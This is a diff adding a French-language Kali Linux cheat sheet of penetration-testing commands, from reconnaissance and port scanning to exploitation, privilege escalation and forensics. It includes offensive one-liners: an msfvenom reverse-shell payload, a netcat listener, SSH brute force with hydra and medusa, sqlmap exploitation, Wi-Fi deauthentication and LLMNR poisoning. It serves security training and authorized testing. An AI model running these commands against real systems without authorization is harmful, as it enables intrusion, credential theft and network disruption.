@@ -1,0 +1,248 @@
+# ================================================
+# Kali Linux — Toutes les commandes (copier-coller)
+# Usage LEGAL et AUTORISE uniquement.
+# Remplacez <cible>, <ip>, <wordlist>, etc. par vos valeurs.
+# ================================================
+
+
+# === 🐧 Système & bases Kali — Mise à jour, gestion des paquets, services ===
+
+# apt update : Mettre à jour la liste des paquets
+sudo apt update && sudo apt full-upgrade -y
+
+# apt install : Installer un outil
+sudo apt install <paquet>
+
+# kali-tweaks : Configurer Kali (shells, réseau, métapaquets)
+sudo kali-tweaks
+
+# systemctl : Gérer un service (ex. ssh)
+sudo systemctl start ssh && sudo systemctl status ssh
+
+# service : Lancer/arrêter un service
+sudo service postgresql start
+
+# msfdb : Initialiser la base de Metasploit
+sudo msfdb init
+
+# whoami / id : Vérifier l'utilisateur et les privilèges
+id
+
+# uname : Version du noyau et de l'OS
+uname -a
+
+
+# === 🔍 Reconnaissance & OSINT — Collecte d'informations passive et active ===
+
+# whois : Informations d'enregistrement d'un domaine
+whois exemple.com
+
+# dig : Requêtes DNS détaillées
+dig exemple.com ANY +noall +answer
+
+# host : Résolution DNS rapide
+host -a exemple.com
+
+# dnsrecon : Énumération DNS (transfert de zone, brute)
+dnsrecon -d exemple.com
+
+# dnsenum : Énumération DNS complète
+dnsenum exemple.com
+
+# theHarvester : Emails, sous-domaines, hôtes (OSINT)
+theHarvester -d exemple.com -b all
+
+# sublist3r : Énumération de sous-domaines
+sublist3r -d exemple.com
+
+# fierce : Reconnaissance DNS
+fierce --domain exemple.com
+
+# recon-ng : Framework de reconnaissance modulaire
+recon-ng
+
+# maltego : Analyse de liens et OSINT graphique
+maltego
+
+
+# === 📡 Scan réseau & ports — Découverte d'hôtes et de services ===
+
+# nmap : Scan de ports basique
+nmap -sV -sC <cible>
+
+# nmap : Scan complet de tous les ports
+nmap -p- -T4 <cible>
+
+# nmap : Détection d'OS et scripts NSE
+sudo nmap -A -O <cible>
+
+# nmap : Découverte d'hôtes (ping sweep)
+nmap -sn 192.168.1.0/24
+
+# masscan : Scan de ports très rapide
+sudo masscan <cible>/24 -p1-65535 --rate=1000
+
+# netdiscover : Découverte ARP sur le réseau local
+sudo netdiscover -r 192.168.1.0/24
+
+# arp-scan : Scan ARP du réseau local
+sudo arp-scan --localnet
+
+# rustscan : Scan de ports ultra-rapide
+rustscan -a <cible> -- -sV
+
+
+# === 🌐 Web — énumération & scan — Applications et serveurs web ===
+
+# gobuster : Brute-force de répertoires web
+gobuster dir -u http://<cible> -w /usr/share/wordlists/dirb/common.txt
+
+# gobuster : Énumération de sous-domaines (vhost)
+gobuster vhost -u http://<cible> -w <wordlist>
+
+# ffuf : Fuzzing web rapide
+ffuf -u http://<cible>/FUZZ -w /usr/share/wordlists/dirb/common.txt
+
+# dirb : Scanner de contenu web
+dirb http://<cible>
+
+# nikto : Scanner de vulnérabilités web
+nikto -h http://<cible>
+
+# whatweb : Empreinte des technologies web
+whatweb http://<cible>
+
+# wpscan : Scan de sécurité WordPress
+wpscan --url http://<cible> --enumerate u
+
+# sqlmap : Détection/exploitation d'injections SQL
+sqlmap -u "http://<cible>/page?id=1" --batch --dbs
+
+# wfuzz : Fuzzing de paramètres web
+wfuzz -c -z file,<wordlist> http://<cible>/FUZZ
+
+# burpsuite : Proxy d'interception web
+burpsuite
+
+
+# === 🛡️ Analyse de vulnérabilités — Détection de failles ===
+
+# nmap NSE : Scripts de détection de vulnérabilités
+nmap --script vuln <cible>
+
+# searchsploit : Rechercher un exploit connu
+searchsploit apache 2.4
+
+# nuclei : Scan de vulnérabilités par templates
+nuclei -u http://<cible>
+
+# openvas / gvm : Scanner de vulnérabilités complet
+sudo gvm-setup && sudo gvm-start
+
+
+# === 💥 Exploitation — Frameworks et exploitation (labs autorisés) ===
+
+# msfconsole : Lancer Metasploit
+msfconsole
+
+# msfvenom : Générer un payload de test
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o shell.elf
+
+# searchsploit -m : Copier un exploit localement
+searchsploit -m <chemin/exploit>
+
+# netcat : Écouteur pour reverse shell
+nc -lvnp 4444
+
+
+# === 🔑 Mots de passe & hachages — Cassage de mots de passe (comptes autorisés) ===
+
+# hydra : Brute-force de service (ex. SSH)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<cible>
+
+# john : Cassage de hachages (John the Ripper)
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# hashcat : Cassage GPU (ex. MD5 mode 0)
+hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# hash-identifier : Identifier un type de hachage
+hash-identifier
+
+# hashid : Identifier un hachage
+hashid <hash>
+
+# medusa : Brute-force parallèle
+medusa -h <cible> -u admin -P rockyou.txt -M ssh
+
+# crunch : Générer une wordlist
+crunch 6 8 abc123 -o wordlist.txt
+
+
+# === 📶 Wi-Fi & sans-fil — Audit de réseaux sans-fil (vos propres réseaux) ===
+
+# airmon-ng : Passer la carte en mode monitor
+sudo airmon-ng start wlan0
+
+# airodump-ng : Capturer le trafic Wi-Fi
+sudo airodump-ng wlan0mon
+
+# aireplay-ng : Injection / désauthentification (test)
+sudo aireplay-ng --deauth 10 -a <BSSID> wlan0mon
+
+# aircrack-ng : Casser une capture WPA (autorisée)
+aircrack-ng -w rockyou.txt capture.cap
+
+# wifite : Audit Wi-Fi automatisé
+sudo wifite
+
+
+# === 🕵️ Sniffing & MITM — Analyse de trafic (réseau autorisé) ===
+
+# wireshark : Analyseur de paquets graphique
+wireshark
+
+# tcpdump : Capture de paquets en ligne de commande
+sudo tcpdump -i eth0 -w capture.pcap
+
+# ettercap : MITM et sniffing
+sudo ettercap -T -i eth0
+
+# bettercap : Framework MITM moderne
+sudo bettercap -iface eth0
+
+# responder : Empoisonnement LLMNR/NBT-NS (lab)
+sudo responder -I eth0
+
+
+# === ⬆️ Post-exploitation & privesc — Escalade de privilèges et énumération locale ===
+
+# linpeas : Énumération d'escalade Linux
+./linpeas.sh
+
+# sudo -l : Lister les droits sudo
+sudo -l
+
+# find SUID : Chercher les binaires SUID
+find / -perm -4000 -type f 2>/dev/null
+
+# python shell : Stabiliser un shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+# === 🔬 Forensics & stéganographie — Analyse et récupération ===
+
+# binwalk : Analyser/extraire un firmware ou fichier
+binwalk -e fichier.bin
+
+# steghide : Extraire des données cachées
+steghide extract -sf image.jpg
+
+# exiftool : Lire les métadonnées
+exiftool image.jpg
+
+# foremost : Récupérer des fichiers
+foremost -i disk.img -o sortie/
+
+# strings : Extraire les chaînes lisibles
+strings fichier.bin | less
